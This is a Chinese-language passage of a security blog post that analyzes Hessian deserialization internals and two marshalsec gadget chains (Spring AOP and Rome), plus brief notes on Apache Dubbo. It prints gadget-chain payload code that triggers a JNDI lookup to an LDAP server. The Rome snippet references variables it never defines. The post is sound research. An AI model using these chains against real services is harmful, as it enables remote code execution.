            List friends = new ArrayList();
            friends.add(friend);
            Student stu = new Student();
            stu.setId(id);
            stu.setName(name);
            stu.setGender(gender);
            stu.setInnerMap(innerMap);
            stu.setFriends(friends);
            System.out.println("---------------hessian serialize----------------");
            byte[] obj = serialize(stu);
            System.out.println(new String(obj));
            System.out.println("---------------hessian deserialize--------------");
            Student student = deserialize(obj);
            System.out.println(student);
        }
    }
下面是对上面这个demo进行调试后画出的Hessian在反序列化时处理的大致面貌（图片看不清，可以点[这个链接](https://www.processon.com/view/link/5c714c28e4b03334b5273bd6)查看）：
下面通过在调试到某些关键位置具体说明。
### 获取目标类型反序列化器
首先进入HessianInput.readObject()，读取tag类型标识符，由于Hessian序列化时将结果处理成了Map，所以第一个tag总是M(ascii
77)：
在`case
77`这个处理中，读取了要反序列化的类型，接着调用`this._serializerFactory.readMap(in,type)`进行处理，默认情况下serializerFactory使用的Hessian标准实现SerializerFactory：
先获取该类型对应的Deserializer，接着调用对应Deserializer.readMap(in)进行处理，看下如何获取对应的Derserializer：
第一个红框中主要是判断在`_cacheTypeDeserializerMap`中是否缓存了该类型的反序列化器；第二个红框中主要是判断是否在`_staticTypeMap`中缓存了该类型反序列化器，`_staticTypeMap`主要存储的是基本类型与对应的反序列化器；第三个红框中判断是否是数组类型，如果是的话则进入数组类型处理；第四个获取该类型对应的Class，进入`this.getDeserializer(Class)`再获取该类对应的Deserializer，本例进入的是第四个：
这里再次判断了是否在缓存中，不过这次是使用的`_cacheDeserializerMap`，它的类型是`ConcurrentHashMap`，之前是`_cacheTypeDeserializerMap`，类型是`HashMap`，这里可能是为了解决多线程中获取的问题。本例进入的是第二个`this.loadDeserializer(Class)`：
第一个红框中是遍历用户自己设置的SerializerFactory，并尝试从每一个工厂中获取该类型对应的Deserializer；第二个红框中尝试从上下文工厂获取该类型对应的Deserializer；第三个红框尝试创建上下文工厂，并尝试获取该类型自定义Deserializer，并且该类型对应的Deserializer需要是类似`xxxHessianDeserializer`，xxx表示该类型类名；第四个红框依次判断，如果匹配不上，则使用`getDefaultDeserializer(Class)，`本例进入的是第四个：
`_isEnableUnsafeSerializer`默认是为true的，这个值的确定首先是根据`sun.misc.Unsafe`的theUnsafe字段是否为空决定，而`sun.misc.Unsafe`的theUnsafe字段默认在静态代码块中初始化了并且不为空，所以为true；接着还会根据系统属性`com.caucho.hessian.unsafe`是否为false，如果为false则忽略由`sun.misc.Unsafe`确定的值，但是系统属性`com.caucho.hessian.unsafe`默认为null，所以不会替换刚才的ture结果。因此，`_isEnableUnsafeSerializer`的值默认为true，所以上图默认就是使用的UnsafeDeserializer，进入它的构造方法。
### 获取目标类型各属性反序列化器
在这里获取了该类型所有属性并确定了对应得FieldDeserializer，还判断了该类型的类中是否存在ReadResolve()方法，先看类型属性与FieldDeserializer如何确定：
获取该类型以及所有父类的属性，依次确定对应属性的FIeldDeserializer，并且属性不能是transient、static修饰的属性。下面就是依次确定对应属性的FieldDeserializer了，在UnsafeDeserializer中自定义了一些FieldDeserializer。
### 判断目标类型是否定义了readResolve()方法
接着上面的UnsafeDeserializer构造器中，还会判断该类型的类中是否有`readResolve()`方法：
通过遍历该类中所有方法，判断是否存在`readResolve()`方法。
好了，后面基本都是原路返回获取到的Deserializer，本例中该类使用的是UnsafeDeserializer，然后回到`SerializerFactory.readMap(in,type)`中，调用`UnsafeDeserializer.readMap(in)`：
至此，获取到了本例中`com.longofo.deserialize.Student`类的反序列化器`UnsafeDeserializer`，以各字段对应的FieldSerializer，同时在Student类中定义了`readResolve()`方法，所以获取到了该类的`readResolve()`方法。
### 为目标类型分配对象
接下来为目标类型分配了一个对象：
通过`_unsafe.allocateInstance(classType)`分配该类的一个实例，该方法是一个`sun.misc.Unsafe`中的native方法，为该类分配一个实例对象不会触发构造器的调用，这个对象的各属性现在也只是赋予了JDK默认值。
### **目标类型对象属性值的恢复**
接下来就是恢复目标类型对象的属性值：
进入循环，先调用`in.readObject()`从输入流中获取属性名称，接着从之前确定好的`this._fieldMap`中匹配该属性对应的FieldDeserizlizer，然后调用匹配上的FieldDeserializer进行处理。本例中进行了序列化的属性有innerMap（Map类型）、name（String类型）、id（int类型）、friends（List类型），这里以innerMap这个属性恢复为例。
### **以InnerMap属性恢复为例**
innerMap对应的FieldDeserializer为`UnsafeDeserializer$ObjectFieldDeserializer`：
首先调用`in.readObject(fieldClassType)`从输入流中获取该属性值，接着调用了`_unsafe.putObject`这个位于`sun.misc.Unsafe`中的native方法，并且不会触发getter、setter方法的调用。这里看下`in.readObject(fieldClassType)`具体如何处理的：
这里Map类型使用的是MapDeserializer，对应的调用`MapDeserializer.readMap(in)`方法来恢复一个Map对象：
注意这里的几个判断，如果是Map接口类型则使用HashMap，如果是SortedMap类型则使用TreeMap，其他Map则会调用对应的默认构造器，本例中由于是Map接口类型，使用的是HashMap。接下来经典的场景就来了，先使用`in.readObject()`（这个过程和之前的类似，就不重复了）恢复了序列化数据中Map的key，value对象，接着调用了`map.put(key,value)`，这里是HashMap，在HashMap的put方法会调用`hash(key)`触发key对象的`key.hashCode()`方法，在put方法中还会调用putVal，putVal又会调用key对象的`key.equals(obj)`方法。处理完所有key，value后，返回到`UnsafeDeserializer$ObjectFieldDeserializer`中：
使用native方法`_unsafe.putObject`完成对象的innerMap属性赋值。
## Hessian的几条利用链分析
在marshalsec工具中，提供了对于Hessian反序列化可利用的几条链：
  1. Rome
  2. XBean
  3. Resin
  4. SpringPartiallyComparableAdvisorHolder
  5. SpringAbstractBeanFactoryPointcutAdvisor
下面分析其中的两条Rome和SpringPartiallyComparableAdvisorHolder，Rome是通过`HashMap.put`->`key.hashCode`触发，SpringPartiallyComparableAdvisorHolder是通过`HashMap.put`->`key.equals`触发。其他几个也是类似的，要么利用hashCode、要么利用equals。
### **SpringPartiallyComparableAdvisorHolder**
在marshalsec中有所有对应的Gadget Test，很方便：
这里将Hessian对SpringPartiallyComparableAdvisorHolder这条利用链提取出来看得比较清晰些：
    String jndiUrl = "ldap://localhost:1389/obj";
    SimpleJndiBeanFactory bf = new SimpleJndiBeanFactory();
    bf.setShareableResources(jndiUrl);
    //反序列化时BeanFactoryAspectInstanceFactory.getOrder会被调用，会触发调用SimpleJndiBeanFactory.getType->SimpleJndiBeanFactory.doGetType->SimpleJndiBeanFactory.doGetSingleton->SimpleJndiBeanFactory.lookup->JndiTemplate.lookup
    Reflections.setFieldValue(bf, "logger", new NoOpLog());
    Reflections.setFieldValue(bf.getJndiTemplate(), "logger", new NoOpLog());
    //反序列化时AspectJAroundAdvice.getOrder会被调用，会触发BeanFactoryAspectInstanceFactory.getOrder
    AspectInstanceFactory aif = Reflections.createWithoutConstructor(BeanFactoryAspectInstanceFactory.class);
    Reflections.setFieldValue(aif, "beanFactory", bf);
    Reflections.setFieldValue(aif, "name", jndiUrl);
    //反序列化时AspectJPointcutAdvisor.getOrder会被调用，会触发AspectJAroundAdvice.getOrder
    AbstractAspectJAdvice advice = Reflections.createWithoutConstructor(AspectJAroundAdvice.class);
    Reflections.setFieldValue(advice, "aspectInstanceFactory", aif);
    //反序列化时PartiallyComparableAdvisorHolder.toString会被调用，会触发AspectJPointcutAdvisor.getOrder
    AspectJPointcutAdvisor advisor = Reflections.createWithoutConstructor(AspectJPointcutAdvisor.class);
    Reflections.setFieldValue(advisor, "advice", advice);
    //反序列化时Xstring.equals会被调用，会触发PartiallyComparableAdvisorHolder.toString
    Class pcahCl = Class.forName("org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder");
    Object pcah = Reflections.createWithoutConstructor(pcahCl);
    Reflections.setFieldValue(pcah, "advisor", advisor);
    //反序列化时HotSwappableTargetSource.equals会被调用，触发Xstring.equals
    HotSwappableTargetSource v1 = new HotSwappableTargetSource(pcah);
    HotSwappableTargetSource v2 = new HotSwappableTargetSource(Xstring("xxx"));
    //反序列化时HashMap.putVal会被调用，触发HotSwappableTargetSource.equals。这里没有直接使用HashMap.put设置值，直接put会在本地触发利用链，所以使用marshalsec使用了比较特殊的处理方式。
    HashMap s = new HashMap<>();
    Reflections.setFieldValue(s, "size", 2);
    Class nodeC;
    try {
        nodeC = Class.forName("java.util.HashMap$Node");
    }
    catch ( ClassNotFoundException e ) {
        nodeC = Class.forName("java.util.HashMap$Entry");
    }
    Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
    nodeCons.setAccessible(true);
    Object tbl = Array.newInstance(nodeC, 2);
    Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
    Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
    Reflections.setFieldValue(s, "table", tbl);
看以下触发流程：
经过`HessianInput.readObject()`，到了`MapDeserializer.readMap(in)`进行处理Map类型属性，这里触发了`HashMap.put(key,value)`：
`HashMap.put`有调用了`HashMap.putVal`方法，第二次put时会触发`key.equals(k)`方法：
此时key与k分别如下，都是HotSwappableTargetSource对象：
进入`HotSwappableTargetSource.equals`：
在`HotSwappableTargetSource.equals`中又触发了各自`target.equals`方法，也就是`XString.equals(PartiallyComparableAdvisorHolder)`：
在这里触发了`PartiallyComparableAdvisorHolder.toString`：
发了`AspectJPointcutAdvisor.getOrder`：
触发了`AspectJAroundAdvice.getOrder`：
这里又触发了`BeanFactoryAspectInstanceFactory.getOrder`：
又触发了`SimpleJndiBeanFactory.getTYpe`->`SimpleJndiBeanFactory.doGetType`->`SimpleJndiBeanFactory.doGetSingleton`->`SimpleJndiBeanFactory.lookup`->`JndiTemplate.lookup`->`Context.lookup`：
### **Rome**
Rome相对来说触发过程简单些：
同样将利用链提取出来：
    //反序列化时ToStringBean.toString()会被调用，触发JdbcRowSetImpl.getDatabaseMetaData->JdbcRowSetImpl.connect->Context.lookup
    String jndiUrl = "ldap://localhost:1389/obj";
    JdbcRowSetImpl rs = new JdbcRowSetImpl();
    rs.setDataSourceName(jndiUrl);
    rs.setMatchColumn("foo");
    //反序列化时EqualsBean.beanHashCode会被调用，触发ToStringBean.toString
    ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, obj);
    //反序列化时HashMap.hash会被调用，触发EqualsBean.hashCode->EqualsBean.beanHashCode
    EqualsBean root = new EqualsBean(ToStringBean.class, item);
    //HashMap.put->HashMap.putVal->HashMap.hash
    HashMap s = new HashMap<>();
    Reflections.setFieldValue(s, "size", 2);
    Class nodeC;
    try {
        nodeC = Class.forName("java.util.HashMap$Node");
    }
    catch ( ClassNotFoundException e ) {
        nodeC = Class.forName("java.util.HashMap$Entry");
    }
    Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
    nodeCons.setAccessible(true);
    Object tbl = Array.newInstance(nodeC, 2);
    Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
    Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
    Reflections.setFieldValue(s, "table", tbl);
看下触发过程：
经过`HessianInput.readObject()`，到了`MapDeserializer.readMap(in)`进行处理Map类型属性，这里触发了`HashMap.put(key,value)`：
接着调用了hash方法，其中调用了`key.hashCode`方法：
接着触发了`EqualsBean.hashCode->EqualsBean.beanHashCode`：
触发了`ToStringBean.toString`：
这里调用了`JdbcRowSetImpl.getDatabaseMetadata`，其中又触发了`JdbcRowSetImpl.connect`->`context.lookup`：
### 小结
通过以上两条链可以看出，在Hessian反序列化中基本都是利用了反序列化处理Map类型时，会触发调用`Map.put`->`Map.putVal`->`key.hashCode`/`key.equals`->…，后面的一系列出发过程，也都与多态特性有关，有的类属性是Object类型，可以设置为任意类，而在hashCode、equals方法又恰好调用了属性的某些方法进行后续的一系列触发。所以要挖掘这样的利用链，可以直接找有hashCode、equals以及readResolve方法的类，然后人进行判断与构造，不过这个工作量应该很大；或者使用一些利用链挖掘工具，根据需要编写规则进行扫描。
## Apache Dubbo反序列化简单分析
### **Apache Dubbo Http反序列化**
先简单看下之前说到的HTTP问题吧，直接用官方提供的[samples](https://github.com/apache/dubbo-samples/tree/master/java)，其中有一个dubbo-samples-http可以直接拿来用，直接在`DemoServiceImpl.sayHello`方法中打上断点，在`RemoteInvocationSerializingExporter.doReadRemoteInvocation`中反序列化了数据，使用的是Java
Serialization方式：
抓包看下，很明显的`ac ed`标志：
### **Apache Dubbo Dubbo反序列化**
同样使用官方提供的dubbo-samples-basic，默认Dubbo
hessian2协议，Dubbo对hessian2进行了魔改，不过大体结构还是差不多，在`MapDeserializer.readMap`是依然与Hessian类似：
## 参考
  1. 
  2. 
  3. 
  4. 